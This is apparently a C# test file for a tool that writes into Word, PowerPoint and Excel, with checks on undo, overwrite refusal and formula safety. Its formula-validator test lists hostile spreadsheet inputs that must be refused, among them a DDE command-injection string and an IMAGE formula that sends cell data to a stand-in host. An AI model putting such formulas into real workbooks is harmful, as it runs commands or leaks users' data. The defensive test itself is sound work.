using Vernier.App.Platform;
using Xunit.Abstractions;

namespace Vernier.Tests;

/// <summary>
/// write_to_app's Office paths against the real applications (a fresh, visible instance each, closed without saving):
/// text after the cursor in Word, a slide after the current one in PowerPoint, one cell in Excel, each read back.
/// Skipped when Office is not installed.
/// </summary>
[Collection("desktop")]
public class OfficeWriteTests(ITestOutputHelper output)
{
    private static dynamic? Start(string progId)
    {
        var type = Type.GetTypeFromProgID(progId);
        return type is null ? null : Activator.CreateInstance(type);
    }

    [Fact]
    public void Formulas_that_reach_outside_the_workbook_are_refused_and_plain_values_pass()
    {
        Assert.Null(Office.FormulaProblem("13.7"));
        Assert.Null(Office.FormulaProblem("=0.5*2*9.81*7/5"));
        Assert.NotNull(Office.FormulaProblem("=HYPERLINK(\"http://x\")"));
        Assert.NotNull(Office.FormulaProblem("=WEBSERVICE(A1)"));
        Assert.NotNull(Office.FormulaProblem("='C:\\secret\\[book.xlsx]Sheet1'!A1"));
        Assert.NotNull(Office.FormulaProblem("+cmd|' /c calc'!A0"));
        Assert.NotNull(Office.FormulaProblem("=IMAGE(\"https://x.example/?\"&A1)"));   // fetches a URL built from the sheet
        Assert.Null(Office.FormulaProblem("=ROUND(SQRT(12/0.025),1)"));                  // ordinary maths passes
    }

    [Fact]
    public void Word_gets_the_text_after_the_cursor_as_one_undo_step() => WindowsRealApiTests.OnSta(async () =>
    {
        dynamic? word = Start("Word.Application");
        if (word is null) return;
        try
        {
            word.Visible = true;
            dynamic doc = word.Documents.Add();
            word.Selection.TypeText("Question 1.");
            var hwnd = (nint)(int)word.ActiveWindow.Hwnd;
            output.WriteLine((await Office.DescribeAsync(hwnd, Office.App.Word, null)).Where);
            var done = await Office.WordInsertAsync(hwnd, "Answer", "Fmax = 13.7 N\nThe friction pair is equal and opposite.");
            output.WriteLine(done);
            string all = doc.Content.Text;
            Assert.StartsWith("Question 1.", all);
            Assert.Contains("Answer\rFmax = 13.7 N\rThe friction pair", all);
            doc.Undo(1); // one undo step takes it all back
            Assert.Equal("Question 1.", ((string)doc.Content.Text).Trim());
            doc.Close(0);
        }
        finally { word.Quit(0); }
    });

    [Fact]
    public void PowerPoint_gets_a_slide_after_the_current_one() => WindowsRealApiTests.OnSta(async () =>
    {
        dynamic? ppt = Start("PowerPoint.Application");
        if (ppt is null) return;
        try
        {
            ppt.Visible = -1;
            dynamic pres = ppt.Presentations.Add(-1);
            pres.Slides.Add(1, 1); // a title slide
            await Task.Delay(500);
            var hwnd = System.Diagnostics.Process.GetProcessesByName("POWERPNT").Select(p => p.MainWindowHandle).First(h => h != 0); // the frame the learner would have in front
            output.WriteLine((await Office.DescribeAsync(hwnd, Office.App.PowerPoint, null)).Where);
            var done = await Office.AddSlideAsync(hwnd, "Stacked blocks", ["Fmax = 13.7 N", "Ff = (5/7)F up to Fmax"]);
            output.WriteLine(done);
            Assert.Equal(2, (int)pres.Slides.Count);
            Assert.Equal("Stacked blocks", (string)pres.Slides[2].Shapes.Title.TextFrame.TextRange.Text);
            Assert.Contains("13.7", (string)pres.Slides[2].Shapes.Placeholders[2].TextFrame.TextRange.Text);
            pres.Saved = -1;
            pres.Close();
        }
        finally { ppt.Quit(); }
    });

    [Fact]
    public void Excel_sets_one_cell_and_will_not_overwrite_without_being_told() => WindowsRealApiTests.OnSta(async () =>
    {
        dynamic? excel = Start("Excel.Application");
        if (excel is null) return;
        try
        {
            excel.Visible = true;
            dynamic book = excel.Workbooks.Add();
            var hwnd = (nint)(int)excel.Hwnd;
            async Task<Office.CellTarget> Target(string cell) => (await Office.DescribeAsync(hwnd, Office.App.Excel, cell)).Cell!;
            var b2 = await Target("b2");
            Assert.Equal(("B2", ""), (b2.Address, b2.Old));
            output.WriteLine(await Office.SetCellAsync(hwnd, b2, "=0.5*2*9.81*7/5", false));
            Assert.Equal(13.734, (double)book.ActiveSheet.Range["B2"].Value2, 3);
            var refused = await Assert.ThrowsAsync<OfficeException>(async () => await Office.SetCellAsync(hwnd, await Target("B2"), "1", false));
            Assert.Contains("overwrite", refused.Message);
            await Office.SetCellAsync(hwnd, await Target("B2"), "1", true);
            Assert.Equal(1.0, (double)book.ActiveSheet.Range["B2"].Value2);
            // The cell changed between preview and approval: nothing is written over what nobody saw.
            var seen = await Target("B2");
            book.ActiveSheet.Range["B2"].Value2 = 5;
            Assert.Contains("changed after the preview", (await Assert.ThrowsAsync<OfficeException>(() => Office.SetCellAsync(hwnd, seen, "7", true))).Message);
            // Not one plain cell on this sheet: refused before anything is shown.
            await Assert.ThrowsAsync<OfficeException>(() => Office.DescribeAsync(hwnd, Office.App.Excel, "Sheet2!A1"));
            await Assert.ThrowsAsync<OfficeException>(async () => await Office.SetCellAsync(hwnd, await Target("C3"), "=WEBSERVICE(\"http://example.com\")", false));
            book.Close(false);
        }
        finally { excel.Quit(); }
    });
}
